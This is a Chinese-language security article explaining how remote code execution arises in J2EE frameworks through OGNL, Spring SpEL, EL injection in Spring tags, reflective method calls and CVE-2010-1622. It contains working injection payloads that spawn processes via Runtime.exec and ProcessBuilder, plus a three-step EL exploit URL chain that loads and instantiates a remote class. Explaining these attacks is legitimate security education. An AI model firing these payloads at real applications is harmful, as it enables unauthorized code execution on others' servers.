# J2EE远程代码执行那些事儿(框架层面)

0x00 背景
-------

* * *

在J2EE远程代码执行中,大部分的代码执行情况的本质是,能够从外部去直接控制Java对象(其他语言暂不讨论,其实也差不多),控制Java对象大致包括几种情况:直接new对象;调用对象的方法(包括静态方法);访问对象的属性(赋值)等 

那么一些J2EE框架在设计之中,如果某些功能允许以上操作,可能出现的远程代码执行情况。

0x01 OGNL
---------

* * *

参考：[http://drops.wooyun.org/papers/340](http://drops.wooyun.org/papers/340)

get方式，调用对象的静态方法执行命令： 

```
...
OgnlContext context = new OgnlContext();
Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')",context,context.getRoot());
...  

```

![2014021112460957891.png](http://drops.javaweb.org/uploads/images/81720ef4cc4a01b484d8a96b1b9d29d23ddcc2ec.jpg)

set方式，new一个对象调用方法执行命令： 

```
...
OgnlContext context = new OgnlContext();
Ognl.setValue(new java.lang.ProcessBuilder((new java.lang.String[] {"calc" })).start(), context,context.getRoot());
...  

```

那么我们在使用OGNL实现某些J2EE框架功能或者机制中，如果getValue或setValue函数是允许外部参数**直接完整内容**传入的，那肯定是很危险的！！！ 

比如：webWork及Struts2框架（其实真是不想说，Struts2简直就是在拖Java安全水平的后腿。它所有OGNL远程执行代码的漏洞的形成，可以用一句话简单概括：**在使用OGNL实现框架某些功能或机制时，允许外部参数直接传入OGNL表达式或安全限制被饶过等**） 

0x02 在spring框架中也有类似OGNL的Spel表达式
-------------------------------

* * *

### 1.调用对象的静态方法执行命令: 

```
...
org.springframework.expression.Expression exp=parser.parseExpression("T(java.lang.Runtime).getRuntime().exec('calc')");
...   

```

![2014021112491712314.png](http://drops.javaweb.org/uploads/images/374b68afe5c95ede3f91476162553646b85b8983.jpg)

### 2.new一个对象调用方法执行命令: 

```
...
org.springframework.expression.Expression exp=parser.parseExpression("new java.lang.ProcessBuilder((new java.lang.String[]{'calc'})).start()");
... 

```

![2014021112505361561.png](http://drops.javaweb.org/uploads/images/b74d8211b0d820780929428f1f8a537246ea6abe.jpg)

但spring在安全方面应该不会像struts2一样这么不负责任（不过，现在稍微好点了！），它有没有类似的安全漏洞，有兴趣的可以去找找 ^-^ 

0x03 spring 标签实现中的el表达式注入
-------------------------

* * *

例如，类似的代码场景： 

```
...
el: <spring:message text="${param.el}"></spring:message>
... 

```

之前是个信息泄露漏洞（路径及jar等信息）： 

![2014021112525255051.png](http://drops.javaweb.org/uploads/images/6282341806f68c7e754ab38979f2f110c5ccde44.jpg)

前段时间老外弄出了远程命令执行,部分exp（网上都有，有兴趣自己找试一下。能否执行代码和web容器有很大关系，最好选老外一样的Glassfish或者resin某些版本用反射技巧实现执行代码）:

```
http://127.0.0.1:8080/spring/login.jsp?el=${pageContext.request.getSession().setAttribute("exp","".getClass().forName("java.util.ArrayList").newInstance())}

```

  

```
http://127.0.0.1:8080/spring/login.jsp?el=${pageContext.request.getSession().getAttribute("exp").add(pageContext.getServletContext().getResource("/").toURI().create("http://127.0.0.1:8080/spring/").toURL())}

```

  

```
http://127.0.0.1:8080/spring/login.jsp?el=${pageContext.getClass().getClassLoader().getParent().newInstance(pageContext.request.getSession().getAttribute("exp").toArray(pageContext.getClass().getClassLoader().getParent().getURLs())).loadClass("exp").newInstance()} 

```

原理简单描述：远程加载一个exp.class,在构造器中执行命令（利用对象初始化执行代码）.(因为其他web服务器对象方法调用被限制，所以执行恶意代码肯定会有问题) 

**这个漏洞重要的是学习它的利用技巧！**实际危害其实不大！ 

0x04 反射机制实现功能时，动态方法调用
---------------------

* * *

参考：[http://zone.wooyun.org/content/6971](http://zone.wooyun.org/content/6971)

其实，这篇文章主要给出的是**反射机制使用不当造成的方法越权访问**漏洞类型场景，而不是struts2这个漏洞本身，可能大家都**怀恋**之前一系列struts2轻松getshell的exp了！ 

简化后的伪代码: 

```
... 
Class clazz = 对象.getClass(); 
Method m = clazz.getDeclaredMethod("有实际危害的方法"); 
m.invoke(对象);   
...

```

原理简单描述：本质其实很简单，getDeclaredMethod的函数如果允许外部参数输入，就可以直接调用方法了，也就是执行代码，只是危害决定于调用的方法的实际power！ 

0x05 spring class.classLoader.URLs[0]对象属性赋值
-------------------------------------------

* * *

cve-2010-1622 这是我最喜欢的一个漏洞利用技巧：

![2014021112554878852.png](http://drops.javaweb.org/uploads/images/6e7a01bbad790fae869236f46e4e6c49c5f9fd0b.jpg)

这个利用有点绕，其实如果看得懂Java其实也很简单！（大家常说，**喜欢熬夜的coder不是好员工**，睡觉了！） 

以前看了很多篇漏洞分析文章，其中这篇不错（说得算比较清晰），推荐它： 

[http://www.iteye.com/topic/1123382](http://www.iteye.com/topic/1123382)

另外，其实我个人觉得，这个漏洞的其他利用的实际危害要超过执行命令方式，比如：拒绝服务等 

如果把你想像力再上升一个层面:在**任意场景**中只要能够控制Java对象,理论上它就能执行代码(至于是否能够被有效利用是另外一回事)。其实说得再执白点，写底层代码的程序员知不知道这些问题可能导致安全漏洞！